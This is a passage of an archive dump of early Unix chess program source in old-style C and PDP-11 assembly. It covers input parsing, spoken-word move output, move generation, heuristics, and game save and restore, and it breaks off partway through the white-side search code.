char	sbuf[100];
-- /usr/ken/chess/pio.c mode=0100644 uid=6 gid=1 atime=173637321 mtime=173637321 --
#include "old.h"

rline()
{
	char *p1;
	int c;

loop0:
	p1 = sbuf;
loop:
	c = getchar();
	if(c <= 0)
		exit();
	if(c == '#')
		goto loop0;
	if(c != '*' && c != '0') {
		*p1++ = c;
		goto loop;
	}
	switch(getchar()) {

	case '#':
		goto loop0;

	case '*':
	case '0':
		if(p1 != sbuf+4) {
			printf("bad input\n");
			goto loop0;
		}
		sbuf[0] =+ 'a'-'1';
		sbuf[2] =+ 'a'-'1';
		*p1++ = '\0';
		return;

	case '9':
		onhup();

	case '1':
		spread("");
		return;

	case '2':
		spread("first");
		return;

	case '3':
		spread("clock");
		return;

	case '4':
		spread("score");
		return;

	case '5':
		spread("remove");
		return;

	case '6':
		spread("repeat");
		return;

	case '7':
		spread("save");
		return;

	case '8':
		spread("restore");
		return;
	}
	printf("bad option\n");
	goto loop;
}

spread(s)
char *s;
{
	char *p;

	p = sbuf;
	while(*p++ = *s++) ;
}

pboard()
{
	int i, x, y, c, p;

	i = 0;
	x = 8;
	while(x--) {
		y = 8;
		c = 0;
		while(y--) {
			p = board[i++];
			if(p == 0) {
				c++;
				continue;
			}
			if(c) {
				if(c != 1)
					putnumb(c);
				printf("space\n");
				c = 0;
			}
			if(p < 0)
				printf("white "); else
				printf("black ");
			putpiece("kqrbnp pnbrqk"[p+6]);
		}
		pause();
		printf("end\n");
		pause();
	}
}

putpiece(p)
{
	char *s;

	s = "god only knows";
	switch(p) {

	case 'p':
		s = "pawn";
		break;

	case 'n':
		s = "knight";
		break;

	case 'b':
		s = "bishop";
		break;

	case 'r':
		s = "rook";
		break;

	case 'q':
		s = "queen";
		break;

	case 'k':
		s = "king";
		break;
	}
	printf("%s\n", s);
}

out1(m)
{
	putnumb(moveno);
	pause();
	out(m);
	pause();
}

out(m)
int m;
{
	int from, to, epf, pmf;

	from = m>>8;
	to = m&0377;
	mantom? bmove(m): wmove(m);
	epf = pmf = 0;
	switch(amp[-1]) {

	case 0:
	case 1:
		stdp(board[to]);
	ed:
		printf("at\n");
		stdb(from);
		if(amp[-2]) {
			printf("takes\n");
			stdp(amp[-2]);
			printf("at\n");
		} else
			printf("to\n");
		stdb(to);
		break;

	case 3:
		printf("castle queen side\n");
		break;

	case 2:
		printf("castle king side\n");
		break;

	case 4:
		epf = 1;
		putpiece('p');
		goto ed;

	case 5:
		pmf = 1;
		putpiece('p');
		goto ed;
	}
	if(pmf) {
		printf("becomes\n");
		putpiece('q');
	}
	if(epf) {
		printf("en passent\n");
	}
	if(check())
		printf("check\n");
	mantom? bremove(): wremove();
}

stdp(p)
int p;
{

	if(p < 0)
		p = -p;
	p = "ppnbrqk"[p];
	putpiece(p);
}

stdb(b)
int b;
{
	int r, f;

	r = b/8;
	if((f = b%8) < 4)
		putpiece('q'); else {
		putpiece('k');
		f = 7-f;
	}
	f = "rnb\0"[f];
	if(f)
		putpiece(f);
	putnumb(mantom? r+1: 8-r);
}

prtime(a, b)
{

	printf("compute time is\n");
	putnumb(a);
	printf("real time is\n");
	putnumb(b);
	pause();
}

putnumb(n)
{

	if(n <= 12) {
		putdig(n);
		putchar('\n');
		return;
	}
	if(n <= 19) {
		putdig(n+1);
		printf("teen\n");
		return;
	}
	if(n >= 100) {
		putnumb(n/100);
		printf("hundred\n");
		n =% 100;
		if(n)
			putnumb(n);
		return;
	}
	putdig(n/10+11);
	printf("tee\n");
	n =% 10;
	if(n)
		putnumb(n);
}

putdig(n)
{
	char *s;

	s = "god only knows";
	switch(n) {

	case 0:
		s = "zero";
		break;

	case 1:
		s = "one";
		break;

	case 2:
		s = "two";
		break;

	case 3:
		s = "three";
		break;

	case 4:
	case 15:
		s = "four";
		break;

	case 5:
		s = "five";
		break;

	case 6:
	case 17:
		s = "six";
		break;

	case 7:
	case 18:
		s = "seven";
		break;

	case 8:
	case 19:
		s = "eight";
		break;

	case 9:
	case 20:
		s = "nine";
		break;

	case 10:
		s = "ten";
		break;

	case 11:
		s = "eleven";
		break;

	case 12:
		s = "twelve";
		break;

	case 13:
		s = "twen";
		break;

	case 14:
		s = "thir";
		break;

	case 16:
		s = "fif";
		break;
	}
	printf(s);
}

pause()
{

	printf("...\n");
}

score1(m)
{
	if(!mantom) {
		putnumb(moveno);
		pause();
	}
	out(m);
	pause();
}

score()
{
	int *p;

	p = amp;
	while(amp[-1] != -1) {
		mantom? wremove(): bremove();
		decrem();
	}
	posit(score1, p);
	printf("the end\n");
}
-- /usr/ken/chess/play.c mode=0100644 uid=6 gid=1 atime=173637326 mtime=173637326 --
#include "old.h"

play(f)
int f;
{
	int t, i, ts[7];

	clock();
	ts[6] = 0;
	if(f) goto first;
loop:
	intrp = 0;
	move();

first:
	if(manflg)
		goto loop;
	i = mantom;
	t = clktim[i];
	if(!bookm())
	if(!mate(mdepth, 1))
		xplay();
	if(intrp) {
		decrem();
		mantom? bremove(): wremove();
		goto loop;
	}
	if(!abmove) {
		printf("Resign\n");
		onhup();
	}
	makmov(abmove);
	i = clktim[i];
	t = i-t;
	times(ts);
	prtime((ts[0]-ts[6])/60, t);
	ts[6] = ts[0];
	if(i/moveno > 150) {
		if(depth > 1)
			goto decr;
		goto loop;
	}
	if(depth==3 && t>180)
		goto decr;
	if(depth==1 && t<60)
		goto incr;
	if(game==3 && t<60 && depth==2)
		goto incr;
	goto loop;

incr:
	depth++;
	goto loop;

decr:
	goto loop;
}

move()
{
	int a, *p, *p1;

loop:
	lmp = done();
	a = manual();
	p = done();
	p1 = p;
	while(p1 != lmp) {
		p1++;
		if(*p1++ == a) {
			lmp = p;
			makmov(a);
			return;
		}
	}
	printf("Illegal move\n");
	lmp = p;
	goto loop;
}

manual()
{
	int a, b, c;
	char *p1;
	extern out1;

loop:
	intrp = 0;
	stage();
	rline();
	sbufp = sbuf;
	if(match("save")) {
		save();
		goto loop;
	}
	if(match("remove")) {
		if(amp[-1] != -1) {
			decrem();
			mantom? bremove(): wremove();
		}
		if(amp[-1] != -1) {
			decrem();
			mantom? bremove(): wremove();
		}
		goto loop;
	}
	if(match("exit"))
		exit();
	if(match("manual")) {
		manflg = !manflg;
		goto loop;
	}
	if(match("resign"))
		onhup();
	if(moveno == 1 && mantom == 0) {
		if(match("first"))
			play(1);
		if(match("restore")) {
			restore();
			goto loop;
		}
	}
	if(match("clock")) {
		clktim[mantom] =+ clock();
		ctime("white", clktim[0]);
		ctime("black", clktim[1]);
		goto loop;
	}
	if(match("score")) {
		score();
		goto loop;
	}
	if(match("hint")) {
		a = xplay();
		out(abmove);
		printf(" %d\n", a);
		goto loop;
	}
	if(match("repeat")) {
		if(amp[-1] != -1) {
			a = amp;
			mantom? wremove(): bremove();
			decrem();
			posit(&out1, a);
		}
		goto loop;
	}
	if(*sbufp == '\0') {
		pboard();
		goto loop;
	}
	if((a=algin()) != 0) {
		mfmt = 1;
		return(a);
	}
	if((a=stdin()) != 0) {
		mfmt = 0;
		return(a);
	}
	printf("eh?\n");
	goto loop;
}

algin()
{
	int from, to;

	from = cooin();
	to = cooin();
	if(*sbufp != '\0') return(0);
	return((from<<8)|to);
}

cooin()
{
	int a, b;

	a = sbufp[0];
	if(a<'a' || a>'h') return(0);
	b = sbufp[1];
	if(b<'1' || b>'8') return(0);
	sbufp =+ 2;
	a = (a-'a')+8*('8'-b);
	return(a);
}

match(s)
char *s;
{
	char *p1;
	int c;

	p1 = sbufp;
	while((c = *s++) != '\0')
		if(*p1++ != c) return(0);
	sbufp = p1;
	return(1);
}

done()
{
	int *p;

	if(rept() > 3) {
		printf("Draw by repetition\n");
		onhup();
	}
	p = lmp;
	mantom? bagen(): wagen();
	if(p == lmp) {
		if(check())
			if(mantom)
				printf("White wins\n"); else
				printf("Black wins\n"); else
		printf("Stale mate\n");
		onhup();
	}
	return(p);
}

xplay()
{
	int a;

	abmove = 0;
	a = mantom? bplay(): wplay();
	ivalue = a;
	return(a);
}

term()
{
	int p[2];

	if(bookp)
		exit();
	mfmt = 0;
	pipe(p);
	if(fork()) {
		close(1);
		dup(p[1]);
		close(2);
		score();
		exit();
	}
	close(0);
	dup(p[0]);
	close(p[1]);
	execl("/bin/mail", "mail", "chess", 0);
	execl("/usr/bin/mail", "mail", "chess", 0);
	exit();
}
-- /usr/ken/chess/qsort.s mode=0100644 uid=6 gid=1 atime=173637328 mtime=173637328 --
/ qsort interfact to c

/	qsort(from, to)

.globl	_qsort
_qsort:
	mov	2(sp),r1
	mov	4(sp),r2
	jsr	pc,qsort
	rts	pc


qsort:
	mov	r2,r3
	sub	r1,r3
	cmp	r3,$4
	ble	done
	asr	r3
	bic	$3,r3
	add	r1,r3
	mov	r1,-(sp)
	mov	r2,-(sp)

loop:
	cmp	r1,r3
	bhis	loop1
	cmp	(r1),(r3)
	bgt	loop1
	add	$4,r1
	br	loop

loop1:
	cmp	r2,r3
	blos	1f
	sub	$4,r2
	mov	r2,r0
	cmp	(r0),(r3)
	bge	loop1

	mov	(r1),r0
	mov	(r2),(r1)+
	mov	r0,(r2)+
	mov	(r1),r0
	mov	(r2),(r1)
	mov	r0,(r2)
	cmp	-(r1),-(r2)
	cmp	r1,r3
	bne	loop
	mov	r2,r3
	br	loop

1:
	cmp	r1,r3
	beq	1f
	mov	(r1),r0
	mov	(r2),(r1)+
	mov	r0,(r2)+
	mov	(r1),r0
	mov	(r2),(r1)
	mov	r0,(r2)
	cmp	-(r1),-(r2)
	mov	r1,r3
	br	loop1

1:
	mov	(sp)+,r2
	mov	r3,-(sp)
	mov	r3,r1
	add	$4,r1
	jsr	pc,qsort
	mov	(sp)+,r2
	mov	(sp)+,r1
	br	qsort

done:
	rts	pc

	rti = 2

/	itinit()

.globl	_itinit
.globl	_intrp, _term
signal = 48.

_itinit:
	sys	signal; 1; 1
	bit	$1,r0
	bne	1f
	sys	signal; 1; _onhup
1:
	sys	signal; 2; 1
	bit	$1,r0
	bne	1f
	sys	signal; 2; onint
1:
	sys	signal; 3; 1
	rts	pc

.globl	_onhup
_onhup:
	sys	signal; 1; 1
	sys	signal; 2; 1
	sys	signal; 3; 1
	jmp	_term

onint:
	mov	r0,-(sp)
	sys	signal; 2; onint
	clr	r0
	sys	seek; 0; 2
	mov	2(sp),r0
	inc	_intrp
	mov	(sp)+,r0
	rti

/	t = clock()

.globl	_clock
_clock:
	sys	time
	mov	r0,-(sp)
	mov	r1,-(sp)
	sub	t+2,r1
	sbc	r0
	sub	t,r0
	mov	r1,r0
	mov	(sp)+,t+2
	mov	(sp)+,t
	rts	pc

.bss
t:	.=.+4
-- /usr/ken/chess/rc mode=0100644 uid=6 gid=1 atime=173637329 mtime=173637329 --
cc -c -O agen.c
as att.s; mv a.out att.o
as bgen.s; mv a.out bgen.o
cc -c -O bheur.c
as bmove.s; mv a.out bmove.o
cc -c -O book.c
cc -c -O bplay.c
as ctrl.s; mv a.out ctrl.o
cc -c -O data.c
cc -c -O init.c
cc -c -O io.c
cc -c -O mater.c
cc -c -O pio.c
cc -c -O play.c
as qsort.s; mv a.out qsort.o
cc -c -O savres.c
cc -c -O stat.c
cc -c -O stdin.c
as wgen.s; mv a.out wgen.o
cc -c -O wheur.c
as wmove.s; mv a.out wmove.o
cc -c -O wplay.c
-- /usr/ken/chess/savres.c mode=0100644 uid=6 gid=1 atime=173637331 mtime=173637331 --
#include "old.h"

save()
{
	int i;
	register f;

	f = creat("chess.out", 0666);
	if(f < 0) {
		printf("cannot create file\n");
		return;
	}
	write(f, clktim, 4);
	write(f, &bookp, 2);
	write(f, &moveno, 2);
	write(f, &game, 2);
	i = amp-ambuf;
	write(f, &i, 2);
	write(f, &mantom, 2);
	write(f, &value, 2);
	write(f, &ivalue, 2);
	write(f, &depth, 2);
	write(f, &flag, 2);
	write(f, &eppos, 2);
	write(f, &bkpos, 2);
	write(f, &wkpos, 2);
	write(f, board, 128);
	write(f, ambuf, i*2);
	close(f);
}

restore()
{
	int i;
	register f;

	f = open("chess.out", 0);
	if(f < 0) {
		printf("cannot open file\n");
		return;
	}
	read(f, clktim, 4);
	read(f, &bookp, 2);
	read(f, &moveno, 2);
	read(f, &game, 2);
	read(f, &i, 2);
	amp = ambuf+i;
	read(f, &mantom, 2);
	read(f, &value, 2);
	read(f, &ivalue, 2);
	read(f, &depth, 2);
	read(f, &flag, 2);
	read(f, &eppos, 2);
	read(f, &bkpos, 2);
	read(f, &wkpos, 2);
	read(f, board, 128);
	read(f, ambuf, i*2);
	close(f);
}
-- /usr/ken/chess/stat.c mode=0100644 uid=6 gid=1 atime=173637333 mtime=173637333 --
#include "old.h"

statl()
{
	int *p1, *p2, *p3;

	p1 = p2 = lmp;
	stage();
	mantom? bagen(): wagen();
	if(lmp == p1+1)
		return(p1);
	while(p2 != lmp) {
		p3 = p2++;
		if(mantom) {
			bmove(*p2++);
			*p3 = bstatic();
			bremove();
		} else {
			wmove(*p2++);
			*p3 = wstatic();
			wremove();
		}
	}
	qsort(p1, lmp);
	return(p1);
}

wstatic()
{
	int i, j, h, (*p)();

	h = i = 0;
	while(p = wheur[h++]) {
		j = (*p)();
		i =+ j;
	}
	return(-i);
}

bstatic()
{
	int i, j, h, (*p)();

	h = i = 0;
	while(p = bheur[h++]) {
		j = (*p)();
		i =+ j;
	}
	return(-i);
}

xheur(ploc)
int ploc;
{
	int *p1, *p2, from, to, pie;

	pie = board[ploc];
	p1 = lmp;
	p2 = p1;
	mantom? wgen(): bgen();
	while(p2 != lmp) {
		p2++;
		to = *p2++ & 0377;
		if(to == ploc) {
			from = p2[-1] >> 8;
			if(abs(board[from]) < abs(pie)) {
				lmp = p1;
				return((pval+6)[pie]/60);
			}
		}
	}
	lmp = p1;
	return(0);
}

srnd(p)
int p;
{

	srnd1(p, uleft, -9);
	srnd1(p, uright, -7);
	srnd1(p, dleft, 7);
	srnd1(p, dright, 9);
	srnd1(p, up, -8);
	srnd1(p, left, -1);
	srnd1(p, right, 1);
	srnd1(p, down, 8);
	srnd1(p, 0, 0);
}

srnd1(p, m, o)
int p, m, o;
{

	if((dir[p]&m) == 0)
		control[p+o] =+ 10;
}
-- /usr/ken/chess/stdin.c mode=0100644 uid=6 gid=1 atime=173637334 mtime=173637334 --
#include "old.h"

stdin()
{
	int piece1, piece2, side1, side2, rnk1, rnk2, file1, file2;
	int ckf, c, *p1, *p2, to, piece;
	int ckm, ckamb, nckm, nckamb;

	piece1 = piece2 = side1 = side2 = -1;
	rnk1 = rnk2 = file1 = file2  = -1;
	ckf = 0;
	if(match("o-o-o")||match("ooo")) {
		piece1 = 6;
		file1 = 3;
		side1 = 1;
		file2 = 2;
		side2 = 0;
		goto search;
	}
	if(match("o-o")||match("oo")) {
		piece1 = 6;
		file1 = 3;
		file2 = 1;
		goto search;
	}
	stdpin(&piece1, &side1, &rnk1, &file1);
	c = *sbufp++;
	if(c=='*' || c=='x')
		stdpin(&piece2, &side2, &rnk2, &file2); else
	if(c == '-')
		stdbin(&side2, &rnk2, &file2); else
		sbufp--;

search:
	c = *sbufp++;
	if(c == '+') {
		ckf = 1;
		c = *sbufp++;
	}
	if(c != '\0')
		return(0);

	p1 = p2 = lmp;
	mantom? bagen(): wagen();
	ckm = nckm = -1;
	ckamb = nckamb = 0;
	while(p1 != lmp) {
		p1++;
		piece = board[*p1>>8];
		mantom? bmove(*p1): wmove(*p1);
		to = amp[-3];
		if(pcomp(piece, amp[-4],
			piece1, side1, rnk1, file1))
		if(pcomp(amp[-2], to,
			piece2, side2, rnk2, file2))
		if(comp(ckf, check())) {
			if(ckm >= 0)
				ckamb++;
			ckm = *p1;
		} else {
			if(nckm >= 0)
				nckamb++;
			nckm = *p1;
		}
		p1++;
		mantom? bremove(): wremove();
	}
	lmp = p2;
	if(ckamb || (nckamb && ckm < 0)) {
		printf("ambiguous\n");
		return(-1);
	}
	if(ckm < 0)
		return(nckm);
	return(ckm);
}

stdpin(ap, as, ar, af)
int *ap, *as, *ar, *af;
{
	int c;

	c = *sbufp++;
	if(c == 'q') {
		*as = 0;
		stdpin(ap, as, ar, af);
		return;
	}
	if(c == 'k') {
		*as = 1;
		stdpin(ap, as, ar, af);
		return;
	}
	if(c == 'p') {
		*ap = 1;
		if(*as >= 0)
			*af = 3;
		goto loc;
	}
	if(c == 'n') {
		*ap = 2;
		goto pie;
	}
	if(c == 'b') {
		*ap = 3;
		goto pie;
	}
	if(c == 'r') {
		*ap = 4;
		goto pie;
	}
	sbufp--;
	goto loc;

pie:
	if(*sbufp == 'p') {
		*af = (*ap-1)%3;
		*ap = 1;
		sbufp++;
	}

loc:
	if(*ap<0 && *as>=0) {
		*ap = *as+5;
		*as = -1;
	}
	if(*sbufp == '/') {
		sbufp++;
		stdbin(as, ar, af);
	}
}

stdbin(as, ar, af)
int *as, *ar, *af;
{
	int c;

loop:
	c = *sbufp++;
	if(c == 'q') {
		*as = 0;
		goto kq;
	}
	if(c == 'k') {
		*as = 1;
	kq:
		stdbin(as, ar, af);
		if(*af < 0)
			*af = 3;
		return;
	}

	if(c == 'r') {
		*af = 0;
		goto loop;
	}
	if(c == 'n') {
		*af = 1;
		goto loop;
	}
	if(c == 'b') {
		*af = 2;
		goto loop;
	}
	if(c>'0' && c<'9')
		*ar = c-'1'; else
		sbufp--;
}

pcomp(p, l, pp, sp, rp, fp)
int p, l, pp, sp, rp, fp;
{
	int r, f, s;

	f = l%8;
	r = l/8;
	if(!mantom)
		r = 7-r;
	if(f > 3) {
		f = 7-f;
		s = 1;
	} else
		s = 0;

	if(comp(pp, p))
	if(comp(sp, s))
	if(comp(rp, r))
	if(comp(fp, f))
		return(1);
	return(0);
}

comp(p, v)
int p, v;
{

	if(p < 0) return(1);
	return(p == abs(v));
}

abs(x)
int x;
{

	if(x < 0)
		return(-x);
	return(x);
}
-- /usr/ken/chess/wgen.s mode=0100644 uid=6 gid=1 atime=173637336 mtime=173637336 --
/ generate moves

.globl	_wgen

.globl	_pval, _board, _dir
.globl	_flag, _lmp, _wkpos
.globl	_eppos
.globl	_value

uleft	= 04040
uright	= 04004
dleft	= 00440
dright	= 00404
left	= 00040
right	= 00004
up	= 04000
down	= 00400
u2r1	= 06004
u1r2	= 04006
d1r2	= 00406
d2r1	= 00604
d2l1	= 00640
d1l2	= 00460
u1l2	= 04060
u2l1	= 06040
rank2	= 00200
rank7	= 02000

_wgen:
	mov	$_dir+126.,r4
	mov	$_board+126.,r3
	mov	_lmp,r2
	mov	$63.,r1
0:
	mov	(r3),r0
	bge	1f
	asl	r0
	jmp	*2f(r0)

	king
	queen
	rook
	bishop
	knight
	pawn
2:

pawn:
	bit	$uleft,(r4)
	bne	2f
	tst	-2*9.(r3)
	ble	3f
	jsr	r5,wtry; 0; -9.*2
3:
	mov	r1,r0
	sub	$9,r0
	cmp	r0,_eppos
	bne	2f
	jsr	r5,wtry; 0; -1*2
2:
	bit	$uright,(r4)
	bne	2f
	tst	-7.*2(r3)
	ble	3f
	jsr	r5,wtry; 0; -7.*2
3:
	mov	r1,r0
	sub	$7,r0
	cmp	r0,_eppos
	bne	2f
	jsr	r5,wtry; 0; 2*1
2:
	tst	-2*8.(r3)
	bne	1f
	jsr	r5,wtry; 0; -2*8.
	bit	$rank2,(r4)
	beq	1f
	tst	-2*16.(r3)
	bne	1f
	jsr	r5,wtry; 0; -16.*2
	br	1f

knight:
	jsr	r5,wtry; u2r1; -15.*2
	jsr	r5,wtry; u1r2; -6.*2
	jsr	r5,wtry; d1r2; 10.*2
	jsr	r5,wtry; d2r1; 17.*2
	jsr	r5,wtry; d2l1; 15.*2
	jsr	r5,wtry; d1l2; 6.*2
	jsr	r5,wtry; u1l2; -10.*2
	jsr	r5,wtry; u2l1; -17.*2
	br	1f


1:
	cmp	-(r4),-(r3)
	dec	r1
	bpl	0b
	mov	r2,_lmp
	rts	pc

bishop:
	jsr	r5,wslide; uleft; -9.*2
	jsr	r5,wslide; uright; -7.*2
	jsr	r5,wslide; dleft; 7.*2
	jsr	r5,wslide; dright; 9.*2
	br	1b

rook:
	jsr	r5,wslide; up; -8.*2
	jsr	r5,wslide; down; 8.*2
	jsr	r5,wslide; left; -1.*2.
	jsr	r5,wslide; right; 1.*2
	br	1b
queen:
	jsr	r5,wslide; uleft; -9.*2
	jsr	r5,wslide; uright; -7.*2
	jsr	r5,wslide; dleft; 7.*2
	jsr	r5,wslide; dright; 9.*2
	jsr	r5,wslide; up; -8.*2
	jsr	r5,wslide; left; -1.*2
	jsr	r5,wslide; right; 1.*2
	jsr	r5,wslide; down; 8.*2
	br	1b

king:
	jsr	r5,wtry; uleft; -9.*2
	jsr	r5,wtry; uright; -7.*2
	jsr	r5,wtry; dleft; 7.*2
	jsr	r5,wtry; dright; 9.*2
	jsr	r5,wtry; up; -8.*2
	jsr	r5,wtry; left; -1.*2
	jsr	r5,wtry; right; 1.*2
	jsr	r5,wtry; down; 8.*2
	br	1b

wtry:
	bit	(r5)+,(r4)
	bne	1f
	mov	r3,r0
	add	(r5),r0
	mov	(r0),r0
	blt	1f
	asl	r0
	mov	_value,(r2)
	sub	_pval+12.(r0),(r2)+
	mov	(r5)+,r0
	asr	r0
	add	r1,r0
	movb	r0,(r2)+
	movb	r1,(r2)+
	rts	r5
1:
	tst	(r5)+
	rts	r5

wslide:
	mov	r4,-(sp)
	mov	r3,-(sp)
1:
	bit	(r5)+,(r4)
	bne	1f
	add	(r5),r3
	add	(r5),r4
	mov	(r3),r0
	blt	1f
	bgt	2f
	mov	_value,(r2)+
	mov	r3,r0
	sub	$_board,r0
	asr	r0
	movb	r0,(r2)+
	movb	r1,(r2)+
	tst	-(r5)
	br	1b
2:
	asl	r0
	mov	_value,(r2)
	sub	_pval+12.(r0),(r2)+
	mov	r3,r0
	sub	$_board,r0
	asr	r0
	movb	r0,(r2)+
	movb	r1,(r2)+
1:
	tst	(r5)+
	mov	(sp)+,r3
	mov	(sp)+,r4
	rts	r5
-- /usr/ken/chess/wheur.c mode=0100644 uid=6 gid=1 atime=173637337 mtime=173637337 --
#include "old.h"

/*
 *	mobility
 *	1 for each potential move
 */

wheur1()
{
	int *p1, *p2, *p3, i;

	p1 = lmp;
	wgen();
	p2 = lmp;
	lmp = p1;
	bgen();
	p3 = lmp;
	lmp = p1;
	i = p2-p3;
	i =>> 1;
	return(i);
}

/*
 *	opening 'goodies'
 */

wheur2()
{
	int i;

	i = 0;
	if(game > 2) return(i);
	/*
	 * minor pieces out
	 * knights before bishops
	 */
	i =+ 9*((board[57] != -2)+
		(board[62] != -2));
	i =+ 8*((board[58] != -3)+
		(board[61] != -3));
	/*
	 * blocked central pawns
	 */
	if(board[51] == -1 && board[51-8]!=0) i =- 10;
	if(board[52] == -1 && board[52-8]!=0) i =- 10;
	return(i);
}

/*
 *	castle
 */

wheur3()
{
	int i;

	i = 0;
	/*
	 * queenside ability
	 */
	if(flag&02 && board[48]== -1 && board[49]== -1 && board[50]== -1)
		i =+ 20;
	/*
	 *  kingside ability
	 */
	if(flag&01 && board[53]== -1 && board[54]== -1 && board[55]== -1)
		i =+ 20;
	/*
	 * if both
	 */
	if(i == 40)
		i = 22;
	/*
	 * if castled,
	 * keep pawns in
	 */
	if(wkpos==58)
		if(board[50]== -1 && (board[48]== -1 || board[48-8]== -1) &&
			(board[49]== -1 || board[49-8]== -1))
				i =+ 40;
	if(wkpos==62)
		if(board[53]== -1 && (board[54]== -1 || board[54-8]== -1) &&
			(board[55]== -1 || board[55-8]== -1))
				i =+ 40;
	return(i);
}

/*
 *	prance
 *	a percentage if the
 *	piece on the move
 *	can be driven back
 *	by a smaller piece
 */

wheur4()
{
	int *p1, *p2, ploc, i;

	if(amp[-1] != 1) return(0);
	ploc = amp[-3];
	if(board[ploc] == -1) return(0);
	if(xheur(ploc)) return(0);
	p1 = lmp;
	p2 = p1;
	bagen();
	i = 0;
	while(p2 != lmp) {
		p2++;
		bmove(*p2++);
		i = xheur(ploc);
		bremove();
		if(i)
			break;
	}
	lmp = p1;
	return(i);
}

/*
 *	control
 *	center control
 *		opening
 *		beginning
 *	king control
 *		middle
 *		end
 */

wheur5()
{
	int i, j, k, s, n, d;

	i = 64;
	while(i--)
		control[i] = 0;
	if(game < 2) {
		i = 64;
		while(i--)
			control[i] =+ center[i];
	}
	if(mantom) {
		if((flag&03)==0)
			srnd(wkpos);
	} else {
		if((flag&030)==0)
			srnd(bkpos);
	}
	i = 64;
	s = 0;
	while(i--) {
		n = control[i]*100;
		attack(i);
		j = 0;
		while(k = attacv[j++]) {
			d = (pval+6)[k];
			if(d < 0)
				s =- n/(-d); else
				s =+ n/d;
		}
	}
	return(-s);
}
-- /usr/ken/chess/wmove.s mode=0100644 uid=6 gid=1 atime=173637339 mtime=173637339 --
.globl	_wmove, _wremove
.globl	_board, _pval, _amp, _flag, _eppos, _value, _wkpos
.globl	_game

_wmove:
	mov	_amp,r4
	movb	2(sp),r3		/ to
	movb	3(sp),r2		/ from
	mov	_value,(r4)+
	mov	_flag,(r4)+
	mov	_eppos,(r4)+
	mov	r2,(r4)+
	mov	r3,(r4)+
	asl	r2			/ from as a word index
	asl	r3			/ to as word index
	mov	_board(r3),r0
	mov	r0,(r4)+
	beq	1f
	asl	r0
	sub	_pval+12.(r0),_value
	cmp	r0,$2
	bne	1f
	cmp	r3,$40.*2
	blt	1f
	sub	$25.,_value
	cmp	r3,$48.*2
	blt	1f
	sub	$50.,_value
1:
	mov	_board(r2),r0
	mov	r0,_board(r3)
	clr	_board(r2)
	mov	$-1,_eppos
	asl	r0
	bge	error
	jmp	*0f(r0)		/ type of man
	kmove
	qmove
	rmove
	bmove
	nmove
	pmove
0:
error:
	3


pmove:
	sub	r3,r2
	bge	1f
	neg	r2
1:
	cmp	r2,$2*1			/ ep capture
	bne	1f
	clr	_board(r3)
	mov	$-1,_board-16.(r3)
	mov	$4,(r4)+
	mov	r4,_amp
	rts	pc
1:
	cmp	r2,$2*16.		/ double move
	bne	1f
	movb	3(sp),r2
	sub	$8,r2
	mov	r2,_eppos
	br	move
1:
	cmp	r3,$24.*2
	bge	move
	sub	$25.,_value
	cmp	r3,$16.*2
	bge	move
	sub	$50.,_value
	cmp	r3,$8.*2		/ queen promotion
	bge	move
	sub	$625.,_value
	mov	$-5,_board(r3)
	mov	$5,(r4)+
	mov	r4,_amp
	rts	pc

rmove:
	cmp	r2,$2*63.
	bne	1f
	bic	$1,_flag
	br	move
1:
	cmp	r2,$2*56.
	bne	move
	bic	$2,_flag
	br	move

kmove:
	asr	r3
	mov	r3,_wkpos
	bic	$3,_flag
	cmp	r2,$2*60.
	bne	2f
	cmp	r3,$62.			/ kingside castle
	bne	1f
	dec	_value
	mov	$-4,_board+[2*61.]
	clr	_board+[2*63.]
	mov	$2,(r4)+
	mov	r4,_amp
	rts	pc
1:
	cmp	r3,$58.			/ queenside castle
	bne	2f
	dec	_value
	mov	$-4,_board+[2*59.]
	clr	_board+[2*56.]
	mov	$3,(r4)+
	mov	r4,_amp
	rts	pc
2:					/ king move
	tst	_game
	bne	1f
	add	$2,_value
1:
	clr	(r4)+
	mov	r4,_amp
	rts	pc

qmove:
	tst	_game
	bne	move
	inc	_value
	br	move

nmove:
bmove:
move:
	mov	$1,(r4)+
	mov	r4,_amp
	rts	pc

_wremove:
	mov	_amp,r4
	mov	-(r4),r0
	mov	-(r4),r1
	mov	-(r4),r3
	mov	-(r4),r2
	mov	-(r4),_eppos
	mov	-(r4),_flag
	mov	-(r4),_value
	mov	r4,_amp
	asl	r2
	asl	r3
	mov	_board(r3),_board(r2)
	mov	r1,_board(r3)
	asl	r0
	jmp	*0f(r0)
0:
	movek
	movex
	moveo
	moveoo
	movep
	moveq

movek:
	asr	r2
	mov	r2,_wkpos

movex:
	rts	pc

moveo:
	mov	$-4,_board+[2*63.]
	clr	_board+[2*61.]
	mov	$60.,_wkpos
	rts	pc

moveoo:
	mov	$-4,_board+[2*56.]
	clr	_board+[2*59.]
	mov	$60.,_wkpos;
	rts	pc

movep:
	mov	$-1,_board(r2)
	clr	_board-[2*8.](r3)
	rts	pc

moveq:
	mov	$-1,_board(r2)
	rts	pc
-- /usr/ken/chess/wplay.c mode=0100644 uid=6 gid=1 atime=173637340 mtime=173637340 --
#include "old.h"

wplay()
{
	int v1, v2, *p1, *p2, *p3, ab;

	if(value < ivalue)
		ivalue = value;
	ab = 0;
	v1 = 3000;
	ply = 0;
	p1 = statl();
	if(lmp == p1+2) {
		abmove = p1[1];
		lmp = p1;
		return(ivalue);
	}
	p2 = p1;
	mantom = !mantom;
	while(p2 != lmp) {
		p2++;
		wmove(*p2);
		if(rept())
			v2 = 0; else
			v2 = bplay1(v1);
		if(v2 < v1 && !mate(3, 0)) {
			ab = *p2;
			v1 = v2;
		}
		wremove();
		p2++;
	}
	if(ab == 0 && lmp != p1)
		ab = p1[1];
	mantom = !mantom;
	lmp = p1;
	abmove = ab;
	return(v1);
}

wplay1(ab)
int ab;
{
	int v1, v2, *p1, *p2;

	if(ply >= depth)
		return(wquies(ab));
	ply++;
	p1 = p2 = lmp;
	wgen();
	qsort(p1, lmp);
	v1 = 3000;
	while(p2 != lmp) {
		if(intrp)
			goto out;
		p2++;
		wmove(*p2);
		if(battack(wkpos)) {
			v2 = bplay1(v1);
			if(v2 < v1)
				v1 = v2;
		}
		wremove();
		if(v1 <= ab)
			goto out;
		p2++;
	}
out:
	ply--;
	lmp = p1;
	if(v1 == 3000) {
		v1--;
		if(!check())
			v1 = 0;
	}
	return(v1);
}

wquies(ab)
int ab;
{
	int *p1, *p2, *p3, v1, v2;

	if(ply >= qdepth)
		return(ivalue);
	p1 = p2 = p3 = lmp;
	wgen();
	while(p2 != lmp) {
		v1 = *p2++;
		if(v1 != value && v1 <= ivalue+50) {
